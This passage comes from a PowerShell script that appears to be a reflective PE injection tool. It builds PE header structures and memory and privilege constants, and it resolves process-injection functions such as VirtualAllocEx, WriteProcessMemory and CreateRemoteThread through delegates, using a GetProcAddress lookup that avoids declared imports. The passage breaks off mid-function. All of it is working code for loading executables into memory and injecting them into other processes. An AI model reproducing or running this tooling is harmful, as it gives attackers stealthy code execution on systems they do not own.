                $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
                $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
                $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
                $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
                $e_resField.SetCustomAttribute($AttribBuilder)
    
                $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
    
                $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
                $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
                $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
                $e_res2Field.SetCustomAttribute($AttribBuilder)
    
                $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
                $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
    
                #Struct IMAGE_SECTION_HEADER
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)
    
                $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
                $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
                $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
                $nameField.SetCustomAttribute($AttribBuilder)
    
                $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
                $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER
    
                #Struct IMAGE_BASE_RELOCATION
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
                $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
                $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION
    
                #Struct IMAGE_IMPORT_DESCRIPTOR
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
                $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
                $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR
    
                #Struct IMAGE_EXPORT_DIRECTORY
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
                $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
                $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
                $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
    
                #Struct LUID
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
                $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
                $LUID = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
    
                #Struct LUID_AND_ATTRIBUTES
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
                $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
                $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
                $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
    
                #Struct TOKEN_PRIVILEGES
                $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
                $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
                $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
                $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
                $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
                $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES
    
                return $Win32Types
            }
    
            Function Get-Win32Constants {
                $Win32Constants = New-Object System.Object
    
                $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
                $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
                $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
                $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
                $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
                $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
                $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
                $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
    
                return $Win32Constants
            }
    
            Function Get-Win32Functions {
                $Win32Functions = New-Object System.Object
    
                $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
                $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
                $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
                $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
    
                $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
                $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
                $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
                $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
    
                $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
                $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
                $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
    
                $memsetAddr = Get-ProcAddress msvcrt.dll memset
                $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
                $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
    
                $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
                $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
                $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
    
                $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
                $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
                $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
    
                $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
                $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
                $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
    
                $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
                $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
                $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
                $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
    
                $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
                $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
                $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
                $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
    
                $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
                $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
                $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
                $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
    
                $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
                $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
                $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
                $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
    
                $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
                $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
                $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
    
                $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
                $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
                $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
    
                $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
                $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
                $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
    
                $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
                $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
                $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
    
                $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
                $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
                $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
    
                $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
                $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
                $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
    
                $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
                $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
                $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
    
                $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
                $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
                $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
    
                $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
                $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
                $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
    
                $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
                $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
                $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
    
                $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
                $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
                $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
    
                $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
                $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
                $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
    
                # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
                if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6, 0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6, 2))) {
                    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
                    $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
                    $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
                    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
                }
    
                $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
                $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
                $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
    
                $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
                $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
                $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
                $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
    
                return $Win32Functions
            }
            #####################################
    
    
            #####################################
            ###########    HELPERS   ############
            #####################################
    
            #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
            #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
            Function Sub-SignedIntAsUnsigned {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [Int64]
                    $Value1,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [Int64]
                    $Value2
                )
    
                [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
                [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
                [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
    
                if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
                    $CarryOver = 0
                    for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
                        $Val = $Value1Bytes[$i] - $CarryOver
                        #Sub bytes
                        if ($Val -lt $Value2Bytes[$i]) {
                            $Val += 256
                            $CarryOver = 1
                        }
                        else {
                            $CarryOver = 0
                        }
    
                        [UInt16]$Sum = $Val - $Value2Bytes[$i]
    
                        $FinalBytes[$i] = $Sum -band 0x00FF
                    }
                }
                else {
                    Throw "Cannot subtract bytearrays of different sizes"
                }
    
                return [BitConverter]::ToInt64($FinalBytes, 0)
            }
    
            Function Add-SignedIntAsUnsigned {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [Int64]
                    $Value1,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [Int64]
                    $Value2
                )
    
                [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
                [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
                [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
    
                if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
                    $CarryOver = 0
                    for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
                        #Add bytes
                        [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
    
                        $FinalBytes[$i] = $Sum -band 0x00FF
    
                        if (($Sum -band 0xFF00) -eq 0x100) {
                            $CarryOver = 1
                        }
                        else {
                            $CarryOver = 0
                        }
                    }
                }
                else {
                    Throw "Cannot add bytearrays of different sizes"
                }
    
                return [BitConverter]::ToInt64($FinalBytes, 0)
            }
    
            Function Compare-Val1GreaterThanVal2AsUInt {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [Int64]
                    $Value1,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [Int64]
                    $Value2
                )
    
                [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
                [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
    
                if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
                    for ($i = $Value1Bytes.Count - 1; $i -ge 0; $i--) {
                        if ($Value1Bytes[$i] -gt $Value2Bytes[$i]) {
                            return $true
                        }
                        elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i]) {
                            return $false
                        }
                    }
                }
                else {
                    Throw "Cannot compare byte arrays of different size"
                }
    
                return $false
            }
    
    
            Function Convert-UIntToInt {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [UInt64]
                    $Value
                )
    
                [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
                return ([BitConverter]::ToInt64($ValueBytes, 0))
            }
    
    
            Function Get-Hex {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    $Value #We will determine the type dynamically
                )
    
                $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
                $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.
    
                return $Hex
            }
    
            Function Test-MemoryRangeValid {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [String]
                    $DebugString,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [System.Object]
                    $PEInfo,
    
                    [Parameter(Position = 2, Mandatory = $true)]
                    [IntPtr]
                    $StartAddress,
    
                    [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
                    [IntPtr]
                    $Size
                )
    
                [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
    
                $PEEndAddress = $PEInfo.EndAddress
    
                if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true) {
                    Throw "Trying to write to memory smaller than allocated address range. $DebugString"
                }
                if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true) {
                    Throw "Trying to write to memory greater than allocated address range. $DebugString"
                }
            }
    
            Function Write-BytesToMemory {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [Byte[]]
                    $Bytes,
    
                    [Parameter(Position = 1, Mandatory = $true)]
                    [IntPtr]
                    $MemoryAddress
                )
    
                for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++) {
                    [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
                }
            }
    
            #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
            Function Get-DelegateType {
                Param
                (
                    [OutputType([Type])]
    
                    [Parameter( Position = 0)]
                    [Type[]]
                    $Parameters = (New-Object Type[](0)),
    
                    [Parameter( Position = 1 )]
                    [Type]
                    $ReturnType = [Void]
                )
    
                $Domain = [AppDomain]::CurrentDomain
                $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
                $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
                $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    
                Write-Output $TypeBuilder.CreateType()
            }
    
    
            #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
            Function Get-ProcAddress {
                Param
                (
                    [OutputType([IntPtr])]
    
                    [Parameter( Position = 0, Mandatory = $True )]
                    [String]
                    $Module,
    
                    [Parameter( Position = 1, Mandatory = $True )]
                    [String]
                    $Procedure
                )
    
                # Get a reference to System.dll in the GAC
                $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
                $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    
                # Get a reference to the GetModuleHandle and GetProcAddress methods
                $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
